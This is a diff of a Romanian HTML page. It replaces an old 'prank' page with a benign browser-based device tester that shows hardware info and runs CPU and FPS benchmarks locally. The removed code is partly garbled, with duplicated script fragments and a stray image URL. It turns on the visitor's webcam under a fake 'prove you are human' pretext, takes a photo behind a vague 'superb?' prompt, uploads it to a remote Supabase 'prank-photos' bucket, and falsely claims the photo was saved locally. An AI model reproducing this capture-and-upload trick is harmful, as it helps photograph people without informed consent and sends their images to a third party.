@@ -1,363 +1,646 @@
-https://mexgmskswdstrqkzgvjc.supabase.co/storage/v1/object/prank-photos/photo-1785850448225.jpg<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ro">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>saaaaluuuut</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Device Tester</title>
 
-  <style>
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #111;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
-    }
+<style>
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+}
 
-    .box {
-      width: 90%;
-      max-width: 500px;
-    }
+body{
+    min-height:100vh;
+    background:
+        radial-gradient(circle at top,#16294a,#070b13 55%);
+    color:white;
+    font-family:Arial,sans-serif;
+    padding:30px 15px;
+}
 
-    video {
-      width: 100%;
-      border-radius: 15px;
-      margin-top: 20px;
-    }
+.container{
+    width:min(900px,100%);
+    margin:auto;
+}
 
-    button {
-      padding: 15px 25px;
-      border: 0;
-      border-radius: 10px;
-      font-size: 18px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
+h1{
+    text-align:center;
+    font-size:clamp(34px,7vw,65px);
+    background:linear-gradient(90deg,#00e5ff,#9b5cff,#ff4dac);
+    -webkit-background-clip:text;
+    color:transparent;
+}
 
-    #start {
-      background: #2196f3;
-      color: white;
-    }
-  </style>
+.subtitle{
+    text-align:center;
+    color:#9da7b8;
+    margin:10px 0 30px;
+}
+
+.grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
+    gap:15px;
+}
+
+.card{
+    background:rgba(255,255,255,.06);
+    border:1px solid rgba(255,255,255,.12);
+    border-radius:18px;
+    padding:20px;
+    backdrop-filter:blur(12px);
+}
+
+.card h3{
+    color:#61eaff;
+    margin-bottom:10px;
+}
+
+.value{
+    font-size:22px;
+    font-weight:bold;
+}
+
+.small{
+    color:#aeb7c6;
+    font-size:14px;
+    margin-top:5px;
+    word-break:break-word;
+}
+
+button{
+    width:100%;
+    margin-top:25px;
+    padding:17px;
+    border:0;
+    border-radius:30px;
+    font-size:18px;
+    font-weight:bold;
+    cursor:pointer;
+    color:white;
+    background:linear-gradient(90deg,#00b8ff,#7a44ff,#ff3cac);
+    transition:.25s;
+}
+
+button:hover{
+    transform:scale(1.02);
+    box-shadow:0 0 30px rgba(80,100,255,.5);
+}
+
+button:disabled{
+    opacity:.5;
+    cursor:not-allowed;
+}
+
+.scoreBox{
+    display:none;
+    margin-top:25px;
+    padding:30px;
+    text-align:center;
+    border-radius:20px;
+    background:rgba(0,0,0,.35);
+    border:1px solid rgba(255,255,255,.12);
+}
+
+.score{
+    font-size:75px;
+    font-weight:bold;
+    background:linear-gradient(90deg,#00ffb7,#00d9ff,#b65cff);
+    -webkit-background-clip:text;
+    color:transparent;
+}
+
+.progress{
+    width:100%;
+    height:12px;
+    background:#171d29;
+    border-radius:20px;
+    margin-top:20px;
+    overflow:hidden;
+}
+
+.bar{
+    width:0;
+    height:100%;
+    background:linear-gradient(90deg,#00e5ff,#a55cff,#ff45b5);
+    transition:.3s;
+}
+
+.status{
+    margin-top:10px;
+    color:#bfc7d5;
+}
+
+.footer{
+    text-align:center;
+    color:#697386;
+    margin-top:35px;
+    font-size:13px;
+}
+</style>
 </head>
 
 <body>
 
-<div class="box">
+<div class="container">
 
-  <h1>saaaaaaaaaaluuuuuuuuut</h1>
+<h1>⚡ Device Tester</h1>
+<div class="subtitle">
+Testează rapid laptopul sau telefonul direct din browser
+</div>
 
-  <p id="status">
-    Deschide pentru a continua.
-  </p>
+<div class="grid">
 
-  <button id="start">
-    Deschide 
-  </button>
+<div class="card">
+<h3>📱 Dispozitiv</h3>
+<div class="value" id="device">...</div>
+<div class="small" id="platform"></div>
+</div>
 
-  <video id="camera" autoplay playsinline></video>
+<div class="card">
+<h3>🧠 CPU</h3>
+<div class="value" id="cpu">...</div>
+<div class="small">Fire logice detectate</div>
+</div>
+
+<div class="card">
+<h3>💾 RAM</h3>
+<div class="value" id="ram">...</div>
+<div class="small">Estimare oferită de browser</div>
+</div>
+
+<div class="card">
+<h3>🖥️ Ecran</h3>
+<div class="value" id="screen">...</div>
+<div class="small" id="pixelRatio"></div>
+</div>
+
+<div class="card">
+<h3>🌐 Internet</h3>
+<div class="value" id="network">...</div>
+<div class="small" id="networkExtra"></div>
+</div>
+
+<div class="card">
+<h3>🔋 Baterie</h3>
+<div class="value" id="battery">...</div>
+<div class="small" id="charging"></div>
+</div>
+
+<div class="card">
+<h3>🌍 Browser</h3>
+<div class="value" id="browser">...</div>
+<div class="small" id="ua"></div>
+</div>
+
+<div class="card">
+<h3>🎮 GPU</h3>
+<div class="value" id="gpu">...</div>
+<div class="small">WebGL renderer</div>
+</div>
+
+</div>
+
+<button id="testBtn" onclick="runTest()">
+🚀 PORNEȘTE TESTUL
+</button>
+
+<div class="scoreBox" id="scoreBox">
+
+<div>SCOR DEVICE</div>
+
+<div class="score" id="score">
+0
+</div>
+
+<div class="progress">
+<div class="bar" id="bar"></div>
+</div>
+
+<div class="status" id="status">
+Pregătit
+</div>
+
+</div>
+
+<div class="footer">
+Rezultatele sunt orientative. Un browser nu poate accesa toate componentele hardware.
+</div>
 
 </div>
 
 <script>
-const startButton = document.getElementById("start");
-const video = document.getElementById("camera");
-const statusText = document.getElementById("status");
 
-const SUPABASE_URL = "https://mexgmskswdstrqkzgvjc.supabase.co";
-const SUPABASE_KEY = "PUNE_AICI_CHEIA_TA_ANON";
-const BUCKET = "prank-photos";
+/* ---------------------------
+   DETECTARE DISPOZITIV
+--------------------------- */
 
-let stream;
+const ua = navigator.userAgent;
 
-startButton.addEventListener("click", async () => {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: true,
-      audio: false
+let deviceType = /Android|iPhone|iPad|Mobile/i.test(ua)
+    ? "Telefon / Tabletă"
+    : "Laptop / PC";
+
+document.getElementById("device").textContent = deviceType;
+
+document.getElementById("platform").textContent =
+    navigator.platform || "Necunoscut";
+
+
+/* ---------------------------
+   CPU
+--------------------------- */
+
+const cores = navigator.hardwareConcurrency;
+
+document.getElementById("cpu").textContent =
+    cores ? cores + " threads" : "Nedisponibil";
+
+
+/* ---------------------------
+   RAM
+--------------------------- */
+
+if(navigator.deviceMemory){
+
+    document.getElementById("ram").textContent =
+        navigator.deviceMemory + " GB";
+
+}else{
+
+    document.getElementById("ram").textContent =
+        "Nedisponibil";
+
+}
+
+
+/* ---------------------------
+   ECRAN
+--------------------------- */
+
+document.getElementById("screen").textContent =
+    screen.width + " × " + screen.height;
+
+document.getElementById("pixelRatio").textContent =
+    "Pixel ratio: " + window.devicePixelRatio;
+
+
+/* ---------------------------
+   INTERNET
+--------------------------- */
+
+const connection =
+    navigator.connection ||
+    navigator.mozConnection ||
+    navigator.webkitConnection;
+
+if(connection){
+
+    document.getElementById("network").textContent =
+        connection.effectiveType || "Detectat";
+
+    let extra = "";
+
+    if(connection.downlink){
+        extra += connection.downlink + " Mbps";
+    }
+
+    if(connection.rtt){
+        extra += " • " + connection.rtt + " ms";
+    }
+
+    document.getElementById("networkExtra").textContent = extra;
+
+}else{
+
+    document.getElementById("network").textContent =
+        "Nedisponibil";
+
+}
+
+
+/* ---------------------------
+   BATERIE
+--------------------------- */
+
+if(navigator.getBattery){
+
+    navigator.getBattery().then(battery => {
+
+        function updateBattery(){
+
+            document.getElementById("battery").textContent =
+                Math.round(battery.level * 100) + "%";
+
+            document.getElementById("charging").textContent =
+                battery.charging
+                    ? "⚡ Se încarcă"
+                    : "🔋 Pe baterie";
+
+        }
+
+        updateBattery();
+
+        battery.addEventListener(
+            "levelchange",
+            updateBattery
+        );
+
+        battery.addEventListener(
+            "chargingchange",
+            updateBattery
+        );
+
     });
 
-    video.srcObject = stream;
-    startButton.style.display = "none";
-    statusText.textContent = "Camera este pornită.";
+}else{
 
-    setTimeout(() => {
-      const canvas = document.createElement("canvas");
+    document.getElementById("battery").textContent =
+        "Nedisponibil";
 
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+}
 
-      const ctx = canvas.getContext("2d");
 
-      ctx.drawImage(
-        video,
-        0,
-        0,
-        canvas.width,
-        canvas.height
-      );
+/* ---------------------------
+   BROWSER
+--------------------------- */
 
-      canvas.toBlob(async (blob) => {
-        if (!blob) {
-          statusText.textContent = "Nu s-a putut face fotografia.";
-          return;
-        }
+let browser = "Browser necunoscut";
 
-        const accept = confirm(
-          "Fotografia a fost făcută. Vrei să o încarci?"
-        );
+if(ua.includes("Firefox")) browser = "Firefox";
+else if(ua.includes("Edg")) browser = "Microsoft Edge";
+else if(ua.includes("Chrome")) browser = "Chrome";
+else if(ua.includes("Safari")) browser = "Safari";
 
-        if (!accept) {
-          statusText.textContent = "Fotografia nu a fost încărcată.";
+document.getElementById("browser").textContent =
+    browser;
 
-          stream.getTracks().forEach(track => track.stop());
-          video.style.display = "none";
-          return;
-        }
+document.getElementById("ua").textContent =
+    ua;
 
-        statusText.textContent = "Se încarcă...";
 
-        try {
-          const fileName = "photo-" + Date.now() + ".jpg";
+/* ---------------------------
+   GPU WEBGL
+--------------------------- */
 
-          const response = await fetch(
-            `${SUPABASE_URL}/storage/v1/object/${BUCKET}/${fileName}`,
-            {
-              method: "POST",
-              headers: {
-                "Authorization": `Bearer ${SUPABASE_KEY}`,
-                "apikey": SUPABASE_KEY,
-                "Content-Type": "image/jpeg"
-              },
-              body: blob
-            }
-          );
+function detectGPU(){
 
-          if (!response.ok) {
-            const errorText = await response.text();
-            throw new Error(errorText);
-          }
+    try{
 
-          statusText.textContent =
-            "✅ Fotografia a fost încărcată!";
+        const canvas =
+            document.createElement("canvas");
 
-        } catch (error) {
-          console.error("SUPABASE ERROR:", error);
+        const gl =
+            canvas.getContext("webgl") ||
+            canvas.getContext("experimental-webgl");
 
-          statusText.textContent =
-            "❌ Eroare la încărcare.";
-        }
+        if(!gl)
+            return "Nedisponibil";
 
-        stream.getTracks().forEach(track => track.stop());
-        video.style.display = "none";
-
-      }, "image/jpeg", 0.9);
-
-    }, 1000);
-
-  } catch (error) {
-    console.error("CAMERA ERROR:", error);
-
-    statusText.textContent =
-      "❌ Camera nu a fost permisă.";
-  }
-});
-</script>
-  
-    video.srcObject = stream;
-    startButton.style.display = "none";
-    statusText.textContent = "Camera este pornită.";
-
-    setTimeout(() => {
-      const canvas = document.createElement("canvas");
-
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      const ctx = canvas.getContext("2d");
-
-      ctx.drawImage(
-        video,
-        0,
-        0,
-        canvas.width,
-        canvas.height
-      );
-
-      canvas.toBlob(async (blob) => {
-        if (!blob) {
-          statusText.textContent = "Nu s-a putut face fotografia.";
-          return;
-        }
-
-        const accept = confirm(
-          "Fotografia a fost făcută. Vrei să o încarci?"
-        );
-
-        if (!accept) {
-          statusText.textContent = "Fotografia nu a fost încărcată.";
-
-          stream.getTracks().forEach(track => track.stop());
-          video.style.display = "none";
-          return;
-        }
-
-        statusText.textContent = "Se încarcă...";
-
-        try {
-          const fileName = "photo-" + Date.now() + ".jpg";
-
-          const response = await fetch(
-            `${SUPABASE_URL}/storage/v1/object/${BUCKET}/${fileName}`,
-            {
-              method: "POST",
-              headers: {
-                "Authorization": `Bearer ${SUPABASE_KEY}`,
-                "apikey": SUPABASE_KEY,
-                "Content-Type": "image/jpeg"
-              },
-              body: blob
-            }
-          );
-
-          if (!response.ok) {
-            const errorText = await response.text();
-            throw new Error(errorText);
-          }
-
-          statusText.textContent =
-            "✅ Fotografia a fost încărcată!";
-
-        } catch (error) {
-          console.error("SUPABASE ERROR:", error);
-
-          statusText.textContent =
-            "❌ Eroare la încărcare.";
-        }
-
-        stream.getTracks().forEach(track => track.stop());
-        video.style.display = "none";
-
-      }, "image/jpeg", 0.9);
-
-    }, 1000);
-
-  } catch (error) {
-    console.error("CAMERA ERROR:", error);
-
-    statusText.textContent =
-      "❌ Camera nu a fost permisă.";
-  }
-});
-</script>
-  
-
-    video.srcObject = stream;
-
-    startButton.style.display = "none";
-    statusText.textContent = "stai nemiscat sa vedem ca esti om.";
-
-    setTimeout(() => {
-
-      const canvas = document.createElement("canvas");
-
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      const ctx = canvas.getContext("2d");
-
-      ctx.drawImage(
-        video,
-        0,
-        0,
-        canvas.width,
-        canvas.height
-      );
-
-      canvas.toBlob(async (blob) => {
-
-        if (!blob) return;
-
-        const accept = confirm(
-          "superb?"
-        );
-
-        if (!accept) {
-          statusText.textContent =
-            "mai incearca.";
-
-          stream.getTracks().forEach(track => track.stop());
-          video.style.display = "none";
-
-          return;
-        }
-
-        statusText.textContent =
-          "asteptam...";
-
-        try {
-
-          const formData = new FormData();
-
-          formData.append(
-            "photo",
-            blob,
-            "photo.jpg"
-          );
-
-         const response = await fetch(
-  `${SUPABASE_URL}/storage/v1/object/${BUCKET}/photo-${Date.now()}.jpg`,
-  {
-    method: "POST",
-    headers: {
-      "Authorization": `Bearer ${SUPABASE_KEY}`,
-      "apikey": SUPABASE_KEY,
-      "Content-Type": "image/jpeg"
-    },
-    body: blob
-  }
-);
-          const data = await response.json();
-
-          if (!response.ok) {
-            throw new Error(
-              data.error || "Upload failed"
+        const extension =
+            gl.getExtension(
+                "WEBGL_debug_renderer_info"
             );
-          }
 
-          statusText.textContent =
-            "✅ Fotografia a fost salvată pe laptop!";
+        if(extension){
 
-        } catch (error) {
-
-          console.error(error);
-
-          statusText.textContent =
-            "❌ mai incearca.";
+            return gl.getParameter(
+                extension.UNMASKED_RENDERER_WEBGL
+            );
 
         }
 
-        stream.getTracks().forEach(track => track.stop());
-        video.style.display = "none";
+        return "WebGL detectat";
 
-      }, "image/jpeg", 0.9);
+    }catch(e){
 
-    }, 1000);
+        return "Nedisponibil";
 
-  } catch (error) {
+    }
 
-    console.error(error);
+}
 
-    statusText.textContent =
-      "❌  eroare.";
+document.getElementById("gpu").textContent =
+    detectGPU();
 
-  }
 
-});
+/* ---------------------------
+   CPU BENCHMARK
+--------------------------- */
+
+async function cpuBenchmark(){
+
+    await new Promise(r => setTimeout(r,100));
+
+    const start = performance.now();
+
+    let value = 0;
+
+    for(let i = 0; i < 12000000; i++){
+
+        value +=
+            Math.sqrt(i) *
+            Math.sin(i);
+
+    }
+
+    const end = performance.now();
+
+    return end - start;
+
+}
+
+
+/* ---------------------------
+   FPS TEST
+--------------------------- */
+
+function fpsBenchmark(){
+
+    return new Promise(resolve => {
+
+        let frames = 0;
+
+        const start =
+            performance.now();
+
+        function frame(){
+
+            frames++;
+
+            const now =
+                performance.now();
+
+            if(now - start >= 1500){
+
+                const fps =
+                    frames /
+                    ((now-start)/1000);
+
+                resolve(fps);
+
+                return;
+
+            }
+
+            requestAnimationFrame(frame);
+
+        }
+
+        requestAnimationFrame(frame);
+
+    });
+
+}
+
+
+/* ---------------------------
+   TEST PRINCIPAL
+--------------------------- */
+
+async function runTest(){
+
+    const button =
+        document.getElementById("testBtn");
+
+    const status =
+        document.getElementById("status");
+
+    const scoreBox =
+        document.getElementById("scoreBox");
+
+    const scoreElement =
+        document.getElementById("score");
+
+    const bar =
+        document.getElementById("bar");
+
+
+    button.disabled = true;
+
+    scoreBox.style.display =
+        "block";
+
+
+    status.textContent =
+        "🧠 Testez procesorul...";
+
+    bar.style.width =
+        "20%";
+
+
+    const cpuTime =
+        await cpuBenchmark();
+
+
+    status.textContent =
+        "🎮 Testez animația și FPS-ul...";
+
+    bar.style.width =
+        "55%";
+
+
+    const fps =
+        await fpsBenchmark();
+
+
+    status.textContent =
+        "📊 Calculez rezultatul...";
+
+    bar.style.width =
+        "80%";
+
+
+    await new Promise(
+        r => setTimeout(r,500)
+    );
+
+
+    /*
+       CPU mai rapid =
+       timp mai mic.
+    */
+
+    let cpuScore =
+        100000 / cpuTime;
+
+
+    let fpsScore =
+        fps * 7;
+
+
+    let coreScore =
+        (cores || 2) * 40;
+
+
+    let total =
+        Math.round(
+            cpuScore +
+            fpsScore +
+            coreScore
+        );
+
+
+    total =
+        Math.max(100,total);
+
+
+    scoreElement.textContent =
+        total;
+
+
+    bar.style.width =
+        "100%";
+
+
+    let message = "";
+
+
+    if(total < 500){
+
+        message =
+            "🐢 Dispozitiv modest";
+
+    }else if(total < 900){
+
+        message =
+            "👍 Performanță decentă";
+
+    }else if(total < 1400){
+
+        message =
+            "🔥 Dispozitiv rapid";
+
+    }else{
+
+        message =
+            "🚀 Performanță foarte bună";
+
+    }
+
+
+    status.innerHTML =
+        message +
+        "<br><br>" +
+        "CPU test: " +
+        Math.round(cpuTime) +
+        " ms" +
+        "<br>" +
+        "FPS aproximativ: " +
+        Math.round(fps);
+
+
+    button.disabled =
+        false;
+
+    button.textContent =
+        "🔄 TESTEAZĂ DIN NOU";
+
+}
+
 </script>
 
 </body>
